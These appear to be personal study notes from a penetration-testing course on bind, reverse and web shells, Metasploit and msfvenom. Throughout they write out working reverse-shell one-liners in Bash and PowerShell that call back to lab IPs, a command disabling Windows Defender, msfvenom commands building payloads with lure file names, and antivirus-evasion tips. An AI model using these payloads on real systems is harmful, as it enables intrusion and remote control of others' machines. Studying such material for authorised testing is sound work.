---
title: Shells and Payloads
published: 2025-04-30
description: For My Reference
tags: [Notes]
category: Notes
author: Me
draft: false
---

# 6 - Shells and Payloads

# Shells and Payloads Notes

## Introduction

These notes consolidate information from the provided documents to enhance understanding of shells and payloads for penetration testing, tailored for CAT5 Security's engagement preparation for Inlanefreight. The focus is on gaining interactive system access through shells, delivering them via payloads, and understanding the anatomy of a shell.

## Key Concepts

### Shells

- **Definition**: A program providing an interface for users to input commands and view text output (e.g., Bash, Zsh, cmd, PowerShell).
- **Penetration Testing Context**: A shell is gained by exploiting vulnerabilities or bypassing security to achieve interactive access to a host's operating system.
- **Common Phrases**:
    - "I caught a shell."
    - "I popped a shell!"
    - "I dropped into a shell!"
    - "I'm in!"
- **Purpose**:
    - Direct OS access for executing commands.
    - Enables enumeration, privilege escalation, file transfers, and persistence.
    - CLI shells are stealthier than graphical shells (e.g., VNC, RDP), faster to navigate, and easier to automate.

### Payloads

- **Definition**: Code or scripts that exploit vulnerabilities to deliver a shell to the attacker's system.
- **Role**: Payloads are the delivery mechanism for establishing shell access.

## Anatomy of a Shell

- **Components**:
    - **Operating System**: Provides the shell environment (e.g., Linux, Windows, macOS).
    - **Terminal Emulator**: Software for interacting with the shell.
    - **Command Language Interpreter**: Interprets user commands for the OS.
- **Terminal Emulator**:
    - Acts as the user interface to access the shell.
    - Common emulators:
        - **Windows**: cmd, PowerShell, PuTTY, Kitty, Alacritty
        - **Linux**: Xterm, GNOME Terminal, MATE Terminal, Konsole, Alacritty
        - **macOS**: Terminal, iTerm2, Alacritty
    - Choice is based on personal preference and target system configuration.
    - Open-source emulators can be installed across OSes, but native emulators are typically used on targets.
- **Command Language Interpreter**:
    - Translates user input into OS instructions (e.g., Bash, PowerShell).
    - Also known as shell scripting languages or Command and Scripting Interpreters (per MITRE ATT&CK).
    - Identifying the interpreter is crucial for selecting compatible commands/scripts.
    - Identification methods:
        - **Prompt**: `$` indicates Bash, Ksh, or POSIX shells.
        - **Processes**: Use `ps` to list running shell processes (e.g., `bash`).
        - **Environment Variables**: Use `env` to check `SHELL` variable (e.g., `SHELL=/bin/bash`).
- **Interaction**:
    - The command-line interface (CLI) combines the OS, terminal emulator, and interpreter.
    - Understanding the interpreter informs command/script selection for exploitation.

## Types of Shells

- **Bind Shell**:
    - Opens a port on the target, allowing the attacker to connect.
    - Example: Bind shell on a Linux host.
- **Reverse Shell**:
    - Target connects back to the attacker's system, providing a shell.
    - Example: Reverse shell on a Windows host.
- **Web Shell**:
    - Script uploaded to a web server for browser-based shell access.
    - Requires identifying the web application’s language (e.g., PHP, ASP).

## Shell and Payload Objectives

### Shell Basics

- **Bind Shell (Linux)**:
    - Configure a listener on the target to accept connections.
- **Reverse Shell (Windows)**:
    - Set up the target to initiate a connection to the attacker’s system.
- **Validation**:
    - **Linux**:
        
        ```bash
        ps  # Lists processes, e.g., 'bash'
        env  # Shows 'SHELL=/bin/bash'
        
        ```
        
    - **Windows**:
        - Use `Get-Process` in PowerShell to list processes.
        - Check `$PSVersionTable` for shell details.

### Payload Basics

- **Metasploit Framework (MSF)**:
    - Use `msfvenom` to create and launch payloads.
- **ExploitDB**:
    - Search for Proof of Concept (PoC) exploits and adapt them.
- **Payload Creation**:
    - Craft payloads based on recon results to exploit specific vulnerabilities.

### Getting a Shell

- **Windows**:
    - Use recon results to select or craft a payload for exploitation.
    - Example: Exploit a known vulnerability to deliver a reverse shell.
- **Linux**:
    - Craft or use a payload to exploit the host and establish a shell.
- **Web Shell**:
    - Identify the web application and its language.
    - Deploy a payload (e.g., PHP web shell) for browser-based access.

### Detection

- **Spotting Shells/Payloads**:
    - Analyze logs, processes, or network activity.
    - Example: Check for unusual processes with `ps` or unexpected connections with `netstat`.

## Practical Examples

### Terminal Emulator Interaction

- **Parrot OS Pwnbox**:
    - Open MATE Terminal (green square icon).
    - Type random text (e.g., `wasdf`) to see Bash’s response: `bash: wasdf: command not found`.
    - Validate shell:
        
        ```bash
        ps  # Shows 'bash' process
        env  # Shows 'SHELL=/bin/bash'
        
        ```
        
- **PowerShell**:
    - Open via blue square icon in Pwnbox for Windows-like shell interaction.

### Shell Validation Commands

- **Linux**:
    
    ```bash
    ps  # Lists processes, look for 'bash'
    env  # Check 'SHELL' variable
    
    ```
    
- **Windows**:
    
    ```powershell
    Get-Process  # Lists processes
    $PSVersionTable  # Shows PowerShell details
    
    ```
    

## Benefits of Shell Access

- **Enumeration**: Identify privilege escalation or lateral movement vectors.
- **Persistence**: Maintain access for prolonged operations.
- **Stealth**: CLI shells are less detectable than graphical interfaces.
- **Automation**: Script tasks for efficiency.

## Notes for CAT5 Security Assessment

- **Objective**: Prove proficiency in shells and payloads for the Inlanefreight engagement.
- **Challenges**:
    - Set up bind and reverse shells.
    - Create/deploy payloads using MSF and ExploitDB.
    - Exploit Windows/Linux hosts using recon results.
    - Deploy a web shell on a vulnerable web application.
    - Detect shells/payloads on a host.
- **Focus**: Post-enumeration exploitation and shell establishment.

# Bind Shells Notes

## Introduction

These notes, based on the "Bind Shells" document, detail the concept and practical application of bind shells for penetration testing, specifically for CAT5 Security's preparation for the Inlanefreight engagement. Bind shells involve establishing a listener on a target system to accept incoming connections from an attacker's system.

## Key Concepts

### Bind Shell

- **Definition**: A shell where the target system starts a listener on a specified port, awaiting a connection from the attacker's system (attack box).
- **Mechanism**: The target acts as a server, and the attacker’s system is the client, connecting to the target’s IP and port.
- **Purpose**: Provides interactive access to the target’s OS for command execution, enumeration, and further exploitation.

### Challenges

- **Listener Requirement**: A listener must be running on the target, or the attacker must find a way to start one.
- **Firewall Restrictions**:
    - OS firewalls (Windows/Linux) often block incoming connections unless associated with trusted applications.
    - Network firewalls and NAT/PAT configurations typically restrict incoming traffic, requiring internal network access.
- **Detection**: Incoming connections are more likely to be detected and blocked compared to outbound connections.

### Tools

- **Netcat (nc)**:
    - A versatile tool for TCP, UDP, and Unix socket communication.
    - Functions as both client and server, supporting IPv4/IPv6, proxying, and text I/O.
    - Known as the "Swiss-Army Knife" for network tasks.

## Practical Example: Establishing a Bind Shell with Netcat

- **Scenario**: Interacting with an Ubuntu Linux target on the same network, no security restrictions.
- **Steps**:
    1. **Start Listener on Target (Server)**:
        
        ```bash
        nc -lvnp 7777
        
        ```
        
        - `l`: Listen mode.
        - `v`: Verbose output.
        - `n`: No DNS resolution.
        - `p 7777`: Listen on port 7777.
        - Output: `Listening on [0.0.0.0] (family 0, port 7777)`.
    2. **Connect from Attack Box (Client)**:
        
        ```bash
        nc -nv 10.129.41.200 7777
        
        ```
        
        - Connects to target IP (10.129.41.200) on port 7777.
        - Output: `Connection to 10.129.41.200 7777 port [tcp/*] succeeded!`.
    3. **Verify Connection on Target**:
        - Target shows: `Connection from 10.10.14.117 51872 received!`.
    4. **Test Communication**:
        - Client sends: `Hello Academy`.
        - Target receives: `Hello Academy`.
        - Note: This is a basic TCP session, not a full shell.
    5. **Serve a Bash Shell**:
        - On target:
            
            ```bash
            rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
            
            ```
            
        - Client reconnects: `nc -nv 10.129.41.200 7777`.
        - Outcome: Interactive Bash shell session (`Target@server: $`).

## Payload Breakdown

- **Command**: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f`
- **Components**:
    - `rm -f /tmp/f`: Deletes `/tmp/f` if it exists (`f` ignores nonexistent files).
    - `mkfifo /tmp/f`: Creates a FIFO named pipe for data flow.
    - `cat /tmp/f |`: Reads pipe output, piping to the next command.
    - `/bin/bash -i 2>&1`: Starts an interactive Bash shell, redirecting stderr (`2`) and stdout (`1`).
    - `nc -l 10.129.41.200 7777 > /tmp/f`: Listens on port 7777, redirecting output to `/tmp/f`.

## Notes for CAT5 Security Assessment

- **Objective**: Demonstrate proficiency in setting up bind shells.
- **Challenges**:
    - Start a listener on the target without triggering firewalls.
    - Bypass network/OS firewall restrictions.
    - Deliver the payload to serve a shell (e.g., via command injection or file upload).
- **Considerations**:
    - Bind shells are less practical in real-world scenarios due to firewall restrictions.
    - Prefer reverse shells for stealth and reliability.
- **Tips**:
    - Use standard ports (e.g., 80, 443) to blend with legitimate traffic, though detection risk remains.
    - Practice in a lab (e.g., Pwnbox) to understand Netcat and payload delivery.
    - Document commands and outputs for reference.

# Reverse Shells Notes

## Introduction

These notes, based on the "Reverse Shells" document, outline the concept and implementation of reverse shells for penetration testing, tailored for CAT5 Security's Inlanefreight engagement preparation. Reverse shells involve the target initiating a connection to the attacker’s listener, offering stealth advantages over bind shells.

## Key Concepts

### Reverse Shell

- **Definition**: A shell where the target system initiates a connection to a listener on the attacker’s system (attack box).
- **Mechanism**: The attack box runs a listener, and the target acts as the client, connecting back to the attacker’s IP and port.
- **Purpose**: Provides interactive OS access for command execution, enumeration, and exploitation.

### Advantages

- **Stealth**: Outbound connections are less likely to be blocked or detected by firewalls, as admins often overlook them.
- **Firewall Evasion**: Bypasses strict inbound firewall rules and NAT/PAT configurations.
- **Common Ports**: Using ports like 443 (HTTPS) increases the chance of evading outbound firewall restrictions.

### Challenges

- **Payload Delivery**: Requires a method to execute the payload on the target (e.g., command injection, unrestricted file upload).
- **Antivirus (AV)**: AV software (e.g., Windows Defender) may block payloads, requiring evasion techniques or disabling AV.
- **Deep Packet Inspection**: Advanced firewalls with Layer 7 visibility may detect reverse shells by analyzing packet contents.

### Tools

- **Netcat (nc)**: Used on the attack box to start a listener (e.g., `nc -lvnp 443`).
- **PowerShell**: Native to Windows, ideal for reverse shells on Windows targets.
- **Resources**: Reverse Shell Cheat Sheet provides commands, scripts, and generators for various OSes.

## Practical Example: PowerShell Reverse Shell on Windows

- **Scenario**: Establishing a reverse shell on a Windows target using PowerShell, with Netcat listener on the attack box.
- **Steps**:
    1. **Start Listener on Attack Box**:
        
        ```bash
        sudo nc -lvnp 443
        
        ```
        
        - Listens on port 443 (HTTPS) to evade outbound firewall rules.
        - Output: `Listening on 0.0.0.0 443`.
    2. **Execute Payload on Target (Windows)**:
        - Open command prompt and run:
            
            ```powershell
            powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
            
            ```
            
        - Note: If blocked by Windows Defender, disable AV (admin PowerShell):
            
            ```powershell
            Set-MpPreference -DisableRealtimeMonitoring $true
            
            ```
            
    3. **Verify Connection on Attack Box**:
        - Output: `Connection received on 10.129.36.68 49674`.
        - Interactive shell: `PS C:\Users\htb-student>`.
        - Test commands: `whoami` returns `ws01\htb-student`.

## Considerations

- **Port Selection**: Use common ports (e.g., 443) to blend with legitimate traffic, but advanced firewalls may detect payloads.
- **Native Tools**: Prefer PowerShell on Windows to avoid transferring tools like Netcat, which isn’t native.
- **AV Evasion**: Customize payloads or disable AV in controlled environments (not always feasible in real scenarios).
- **Payload Delivery**: In real-world scenarios, delivery may require exploiting vulnerabilities (e.g., command injection).

## Notes for CAT5 Security Assessment

- **Objective**: Demonstrate proficiency in setting up reverse shells.
- **Challenges**:
    - Deliver payloads to Windows targets without triggering AV.
    - Ensure outbound connections evade firewall detection.
    - Adapt payloads to target OS and available tools.
- **Tips**:
    - Use resources like Reverse Shell Cheat Sheet but customize payloads to avoid detection by admins referencing public repos.
    - Practice in Pwnbox to test PowerShell and Netcat interactions.
    - Document payload execution and listener setup for reference.

# Payloads Notes

## Introduction

These notes, based on the "Payloads" document, explore the concept of payloads in penetration testing, focusing on their role in delivering shells for CAT5 Security’s Inlanefreight engagement preparation. Payloads are dissected to understand their functionality and application across Linux and Windows systems.

## Key Concepts

### Payloads

- **Definition**: Code or scripts that exploit vulnerabilities to deliver a shell or perform malicious actions on a target system.
- **Role**: Instruct the target to establish a shell session with the attacker’s system.
- **Perception**: Often labeled as "malware" or "malicious code," but fundamentally, they are instructions executed like any program.
- **Detection**: AV software (e.g., Windows Defender) may block payloads, requiring evasion techniques.

### Payload Types

- **One-Liners**: Manually executed commands (e.g., Bash or PowerShell scripts).
- **Scripts**: Pre-written code (e.g., Nishang’s `Invoke-PowerShellTcp` for PowerShell).
- **Automated Frameworks**: Generated by tools like Metasploit for streamlined delivery.

### Factors Influencing Payload Choice

- **Operating System**: Linux (Bash) vs. Windows (PowerShell).
- **Shell Interpreter**: Must match target’s interpreter (e.g., Bash, PowerShell).
- **Programming Languages**: Web shells depend on server languages (e.g., PHP, ASP).
- **AV Presence**: Requires customization to bypass detection.

## Payload Analysis

### Bash Reverse Shell One-Liner

- **Command**: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f`
- **Breakdown**:
    - `rm -f /tmp/f`: Deletes `/tmp/f` if it exists.
    - `mkfifo /tmp/f`: Creates a FIFO named pipe.
    - `cat /tmp/f |`: Reads pipe output, piping to the next command.
    - `/bin/bash -i 2>&1`: Launches an interactive Bash shell, redirecting stderr and stdout.
    - `nc 10.10.14.12 7777 > /tmp/f`: Connects to attacker’s listener (10.10.14.12:7777), redirecting output to `/tmp/f`.
- **Purpose**: Delivers a Bash shell to the attacker’s Netcat listener.

### PowerShell Reverse Shell One-Liner

- **Command**: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
- **Breakdown**:
    - `powershell -nop -c`: Runs PowerShell without profile, executing the script.
    - `$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443)`: Connects to attacker’s listener.
    - `$stream = $client.GetStream()`: Sets up network stream.
    - `[byte[]]$bytes = 0..65535|%{0}`: Creates empty byte array.
    - `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`: Reads incoming data.
    - `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)`: Decodes bytes to ASCII.
    - `$sendback = (iex $data 2>&1 | Out-String)`: Executes commands, redirects output.
    - `$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '`: Formats shell prompt.
    - `$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write(...)`: Sends response.
    - `$client.Close()`: Terminates connection.
- **Purpose**: Establishes a PowerShell reverse shell.

### Nishang PowerShell Script

- **Function**: `Invoke-PowerShellTcp`
- **Features**:
    - Supports reverse (`Reverse`) or bind (`Bind`) shells.
    - Parameters: `IPAddress`, `Port`.
    - Example:
        
        ```powershell
        Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
        
        ```
        
    - Initializes TCP client/listener, sends user/computer info, and maintains interactive shell.
- **Error Handling**: Uses try-catch to manage execution errors.

## Notes for CAT5 Security Assessment

- **Objective**: Craft and deliver payloads to establish shells.
- **Challenges**:
    - Tailor payloads to target OS and interpreter.
    - Bypass AV detection (e.g., customize PowerShell scripts).
    - Deliver payloads via vulnerabilities (e.g., command injection).
- **Tips**:
    - Understand payload components to modify for evasion.
    - Use tools like Nishang for pre-built scripts but customize to avoid detection.
    - Test payloads in a lab to ensure compatibility and stealth.

# Payloads and Metasploit Notes

## Introduction

These notes, based on the "Payloads & MSF" document, cover the use of Metasploit Framework (MSF) for automating payload delivery and exploitation, relevant to CAT5 Security’s Inlanefreight engagement preparation. The focus is on leveraging MSF’s pre-built modules and crafting payloads with `msfvenom`.

## Key Concepts

### Metasploit Framework (MSF)

- **Definition**: An automated attack framework by Rapid7 for exploiting vulnerabilities and delivering payloads.
- **Editions**:
    - **Community Edition**: Used in labs (e.g., Pwnbox).
    - **Metasploit Pro**: Paid version for professional penetration testing, including social engineering.
- **Components**:
    - **MSFconsole**: Command-line interface for module interaction.
    - **Msfvenom**: Tool for generating custom payloads.
- **Capabilities**: Exploitation, scanning, enumeration, and payload delivery.
- **Caution**: Understand module effects to avoid unintended damage during live tests.

### Payloads in MSF

- **Role**: Deliver shells (e.g., Meterpreter) to gain interactive access.
- **Types**:
    - **Meterpreter**: In-memory DLL injection payload for stealthy communication, supporting file manipulation, keylogging, and process management.
    - **System Shells**: Dropped from Meterpreter for native OS command access.
- **Automation**: MSF modules streamline payload delivery compared to manual one-liners.

## Practical Example: Exploiting SMB with MSF

- **Scenario**: Exploit a Windows target (10.129.164.25) with SMB service (port 445) using `exploit/windows/smb/psexec`.
- **Recon**:
    
    ```bash
    nmap -sC -sV -Pn 10.129.164.25
    
    ```
    
    - Output: Open ports (135, 139, 445), Windows 7–10, SMB vulnerabilities.
- **Steps**:
    1. **Start MSFconsole**:
        
        ```bash
        sudo msfconsole
        
        ```
        
        - Displays banner with exploit (2131) and payload (592) counts.
    2. **Search Modules**:
        
        ```bash
        search smb
        
        ```
        
        - Identifies `exploit/windows/smb/psexec` (module 56).
    3. **Select Module**:
        
        ```bash
        use 56
        
        ```
        
        - Defaults to `windows/meterpreter/reverse_tcp` payload.
    4. **View Options**:
        
        ```bash
        options
        
        ```
        
        - Key options: `RHOSTS`, `RPORT` (445), `SMBUser`, `SMBPass`, `LHOST`, `LPORT` (4444).
    5. **Configure Module**:
        
        ```bash
        set RHOSTS 10.129.180.71
        set SMBUser htb-student
        set SMBPass <password>
        set LHOST 10.10.14.222
        set LPORT 4444
        
        ```
        
    6. **Run Exploit**:
        
        ```bash
        exploit
        
        ```
        
        - Output:
            
            ```
            [*] Started reverse TCP handler on 10.10.14.222:4444
            [*] 10.129.180.71:445 - Connecting to the server...
            [*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
            [*] 10.129.180.71:445 - Executing the payload...
            [*] Sending stage (175174 bytes) to 10.129.180.71
            [*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675)
            
            ```
            
        - Outcome: Meterpreter session established.
    7. **Interact with Shell**:
        
        ```bash
        shell
        
        ```
        
        - Drops to system shell: `C:\WINDOWS\system32>`.

## Meterpreter Features

- **Stealth**: Uses in-memory DLL injection.
- **Commands**:
    - File upload/download, process management, keylogging, service control.
    - List commands: `?`.
- **Limitations**: Limited command set; use `shell` for full system access.

## Module Details: `exploit/windows/smb/psexec`

- **Function**: Uses valid admin credentials to execute a payload via SMB.
- **Features**: Similar to Sysinternals’ `psexec`, with cleanup capabilities.
- **Payload**: `windows/meterpreter/reverse_tcp` for reverse shell.

## Notes for CAT5 Security Assessment

- **Objective**: Use MSF to deliver payloads and establish shells.
- **Challenges**:
    - Identify vulnerabilities (e.g., SMB) via recon (Nmap).
    - Configure MSF modules accurately (e.g., correct `RHOSTS`, `LHOST`).
    - Ensure payloads bypass AV and firewalls.
- **Tips**:
    - Use `search` and `options` to select and configure modules.
    - Practice in Pwnbox to master MSFconsole and `msfvenom`.
    - Document module configurations and exploit outputs.
    - Understand payload behavior to avoid detection or system disruption.

# Windows Exploitation and MSFvenom Notes

## Introduction to Windows Vulnerabilities

- **Microsoft Dominance**: Microsoft Windows dominates both home and enterprise computing environments, increasing its attack surface due to features like Active Directory, cloud interconnectivity, and Windows Subsystem for Linux (WSL).
- **Vulnerability Statistics**: Over the last five years, 3,688 vulnerabilities were reported in Microsoft products, with numbers growing daily.
- **Prominent Exploits**:
    - **MS06-067**: A critical SMB flaw exploited by the Conficker worm and Stuxnet, enabling easy infiltration of Windows hosts.
    - **EternalBlue (MS17-010)**: Leaked by Shadow Brokers, exploited in WannaCry and NotPetya attacks, targeting SMB vulnerabilities.
    - **BlueKeep (CVE-2019-0708)**: A Remote Desktop Protocol (RDP) flaw allowing remote code execution, affecting Windows 2000 to Server 2008.
    - **SigRed (CVE-2020-1350)**: Exploits DNS SIG resource record handling, enabling complex attacks.

## Fingerprinting Windows Hosts

- **Ping for Initial Detection**: Use ICMP ping to confirm host availability and check TTL (typically 128 for Windows).
- **Nmap for OS Detection**:
    - Command: `sudo nmap -v -O <target_IP>`
    - Identifies OS via TCP/IP stack fingerprinting, e.g., `cpe:/o:microsoft:windows_10`.
    - Use `A` and `Pn` for deeper scans if initial results are limited.
    - Caveat: Firewalls or security features may obscure results; use multiple checks.
- **Banner Grabbing**:
    - Tool: Nmap with `banner.nse` script (`sudo nmap -v --script banner.nse <target_IP>`).
    - Identifies services (e.g., VMware on ports 902/912), aiding exploit selection.

## Payload Types for Windows

- **DLLs**: Dynamic Link Libraries for shared code; malicious DLL injection can elevate privileges to SYSTEM or bypass User Account Control (UAC).
- **Batch Files (.bat)**: Automate command-line tasks, e.g., opening ports or connecting back to an attacker’s system.
- **VBScripts**: Used in phishing attacks to execute code via user actions (e.g., enabling macros in Excel).
- **MSI Files**: Installation packages for Windows Installer; can be crafted to deliver payloads and executed with `msiexec`.
- **PowerShell**: A versatile shell and scripting language for .NET-based automation, ideal for gaining shells and post-exploitation.

## Tools and Frameworks

- **Metasploit Framework (MSF)**: A Swiss-army knife for enumeration, payload generation, exploitation, and post-exploitation.
- **MSFvenom**: Generates payloads for various platforms, with encoding to evade antivirus detection.
- **Mythic C2**: Alternative command-and-control framework for unique payload generation.
- **Nishang**: Collection of offensive PowerShell scripts for penetration testing.
- **Darkarmour**: Generates obfuscated binaries for Windows.
- **Impacket**: Python toolset for interacting with protocols like SMB, PSEXEC, and WMI.
- **Payloads All The Things**: Resource for payload generation cheat sheets and one-liners.

## Payload Delivery Methods

- **Social Engineering**: Email attachments, malicious download links, or USB drops.
- **Network-Based**:
    - **SMB**: Exploit domain-joined shares (e.g., ADMIN$, C$) for file transfers.
    - **Other Protocols**: FTP, TFTP, HTTP/S for payload uploads.
- **Metasploit**: Automates payload staging and execution within exploit modules.

## MSFvenom Payload Creation

- **Listing Payloads**: `msfvenom -l payloads` to view available payloads (e.g., `windows/shell_reverse_tcp`).
- **Staged vs. Stageless Payloads**:
    - **Staged**: Sent in parts (e.g., `windows/meterpreter/reverse_tcp`), requiring multiple network interactions. Suitable for stable networks but leaves more traces.
    - **Stageless**: Sent as a single unit (e.g., `windows/meterpreter_reverse_tcp`), ideal for low-bandwidth or evasion scenarios.
    - **Naming Convention**: Staged payloads have slashes separating stages (e.g., `/shell/reverse_tcp`); stageless combine functionality (e.g., `/meterpreter_reverse_tcp`).
- **Example Command (Stageless Linux Payload)**:
    
    ```bash
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf -o createbackup.elf
    
    ```
    
    - `p`: Specifies payload.
    - `LHOST/LPORT`: Attacker’s IP and port for reverse shell.
    - `f elf`: Output format (ELF for Linux).
    - `o`: Output filename.
- **Example Command (Stageless Windows Payload)**:
    
    ```bash
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe -o BonusCompensationPlan.exe
    
    ```
    
    - `f exe`: Windows executable format.
- **Execution**:
    - Deliver via email, website, USB, or exploit module.
    - Set up a listener: `sudo nc -lvnp 443`.
    - Antivirus evasion requires encoding (not shown in basic examples).

## Example Compromise Walkthrough

1. **Enumerate Host**:
    - Use Nmap: `nmap -v -A <target_IP>` to identify open ports (e.g., 80, 135, 139, 445) and services (e.g., Microsoft IIS, SMB).
2. **Check for Vulnerabilities**:
    - Use Metasploit’s `auxiliary/scanner/smb/smb_ms17_010` to confirm EternalBlue (MS17-010) vulnerability.
3. **Select Exploit and Payload**:
    - Use: `exploit/windows/smb/ms17_010_psexec`.
    - Payload: `windows/meterpreter/reverse_tcp`.
    - Set options: `RHOSTS`, `LHOST`, `LPORT`.
4. **Execute Attack**:
    - Run: `exploit`.
    - Gain SYSTEM-level Meterpreter shell.
5. **Interact with Shell**:
    - Use `getuid` to confirm privileges.
    - Drop to native shell: `shell` (cmd.exe or PowerShell, identified by prompt).

## Shells: CMD vs. PowerShell

- **CMD**:
    - Best for older hosts (pre-Windows 7, no PowerShell).
    - Simple interactions, batch files, or MS-DOS tools.
    - Stealthier (no command logging).
    - Unaffected by execution policies or UAC.
- **PowerShell**:
    - Ideal for .NET object manipulation, cmdlets, or cloud interactions.
    - Logs commands, less stealthy.
    - Affected by execution policies and UAC.
    - Prompt: `PS C:\Windows\system32>` vs. CMD’s `C:\Windows\system32>`.

## Windows Subsystem for Linux (WSL) and PowerShell Core

- **WSL**: Provides a Linux environment on Windows, potentially bypassing Windows Firewall/Defender for network requests.
- **PowerShell Core**: Runs on Linux, enabling cross-platform attacks.
- **Attack Vector**: Malware uses WSL and PowerShell with Python libraries to deliver payloads, often evading AV/EDR.
- **Note**: Advanced topic, requires further research for detection/mitigation.

## Key Considerations

- **Antivirus Evasion**: Use MSFvenom’s encoding options (e.g., `e` for encoders) to bypass Windows Defender.
- **Stealth**: CMD for minimal traces; avoid PowerShell if logging is a concern.
- **Network Constraints**: Use stageless payloads in low-bandwidth environments.
- **Enumeration**: Thorough reconnaissance increases success rates.
- **Firewall Awareness**: WSL and PowerShell Core may bypass traditional defenses.

## Web Shells: Understanding Web Shells

### What Are Web Shells?

- **Definition**: A web shell is a way to control a web server’s operating system (OS) through a web browser. It’s like opening a command-line interface in your browser to run commands on the server.
- **Why Important?**: Most modern services (e.g., websites, streaming platforms) run on web servers. As a penetration tester, you’ll often target these servers to find weaknesses.
- **How It Works**: You exploit a vulnerability in a web application (e.g., a file upload feature) to upload a malicious script (payload) written in a web language like PHP, JSP, or ASP.NET. This script lets you run commands on the server.

### Common Ways to Get a Web Shell

- **File Upload Vulnerabilities**:
    - Public forms allowing file uploads (e.g., a website’s “upload your resume” feature).
    - Profile picture upload areas in user accounts (especially if client-side checks can be bypassed).
- **Application Features**:
    - Some apps (e.g., Tomcat, WebLogic) let you deploy code (e.g., JSP via WAR files), which can be abused to upload a web shell.
- **Misconfigurations**:
    - FTP services that let you upload files directly to the server’s web directory (webroot).
- **Other Attacks**:
    - SQL injection, remote file inclusion (RFI), local file inclusion (LFI), or command injection can also lead to web shell uploads.

### Why Web Shells Matter in Penetration Testing

- **External Testing**: Companies often secure their networks tightly, leaving web applications as the main entry point. Web shells are a common way to “break in” during external penetration tests.
- **Attack Surface**: Web apps are complex and often have vulnerabilities, making them a prime target.
- **Example Scenario**: You find a website with an upload form that accepts any file. You upload a PHP script (e.g., `shell.php`) that lets you run commands like `whoami` or `ls` in the browser.

### Limitations of Web Shells

- **Instability**: Some web apps delete uploaded files after a set time, breaking your shell.
- **Initial Access**: Web shells are often a starting point. You’ll need to upgrade to a more stable “reverse shell” (a connection back to your machine) for long-term access.
- **Example**: A web shell might let you run `whoami`, but if the server deletes your file, you lose access. You’d then use the web shell to run a command that starts a reverse shell.

### Key Takeaways

- Web shells are a powerful way to gain initial access to a web server via browser-based vulnerabilities.
- Look for file upload flaws or misconfigured services to deploy your shell.
- Web shells are unstable, so plan to escalate to a reverse shell for persistence.
- Practice finding vulnerabilities like file uploads in tools like Hack The Box.

---

## Interactive Shells: Upgrading Limited Shells

### What Are Interactive Shells?

- **Definition**: An interactive shell is a command-line interface (like a terminal) where you can type commands and see responses with a prompt (e.g., `sh-4.2$`). It’s “interactive” because it supports features like tab completion and job control.
- **Why Needed?**: When you first gain access to a system (e.g., via a web shell or exploit), you often get a **limited shell** (sometimes called a “jail shell”). These shells lack a prompt and restrict commands, making tasks like `sudo` or `su` difficult.
- **Goal**: Upgrade a limited shell to an interactive shell for better control and access to more commands.

### Common Scenarios

- You exploit a web app and get a shell, but it’s limited (no prompt, few commands work).
- You need to run advanced commands (e.g., `sudo -l`) or escalate privileges, which requires a full interactive shell.

### Methods to Spawn Interactive Shells

These methods assume you have a limited shell and need to upgrade it. The choice depends on what tools are available on the target system (e.g., Linux). Replace `/bin/sh` with `/bin/bash` if available.

1. **Using `/bin/sh`**:
    - **Command**: `/bin/sh -i`
    - **What It Does**: Runs the Bourne shell (`/bin/sh`) in interactive mode (`i`).
    - **Output**: `sh-4.2$` (a prompt appears, but job control may be limited).
    - **Example**: Type `/bin/sh -i` in a limited shell to get a basic interactive shell.
2. **Using Perl**:
    - **Command**: `perl -e 'exec "/bin/sh";'`
    - **What It Does**: Uses Perl (if installed) to execute the shell. Run this in a script or directly.
    - **Example**: If Python isn’t available, check for Perl with `which perl`, then run the command.
3. **Using Ruby**:
    - **Command**: `ruby -e 'exec "/bin/sh";'`
    - **What It Does**: Similar to Perl, uses Ruby (if installed) to spawn a shell.
    - **Example**: Run `which ruby` to confirm Ruby’s presence, then use the command.
4. **Using Lua**:
    - **Command**: `lua -e 'os.execute("/bin/sh")'`
    - **What It Does**: Uses Lua’s `os.execute` function to run a shell.
    - **Example**: Check for Lua (`which lua`), then run the command in a script.
5. **Using AWK**:
    - **Command**: `awk 'BEGIN { system("/bin/sh"); }'`
    - **What It Does**: AWK, a text-processing tool on most Linux systems, can execute a shell.
    - **Example**: Useful when other languages aren’t available. Run the command directly.
6. **Using `find`**:
    - **Command 1**: `find / -name <file> -exec /bin/awk 'BEGIN { system("/bin/sh"); }' \;`
        - Searches for a file and uses AWK to spawn a shell.
    - **Command 2**: `find . -exec /bin/sh \; -quit`
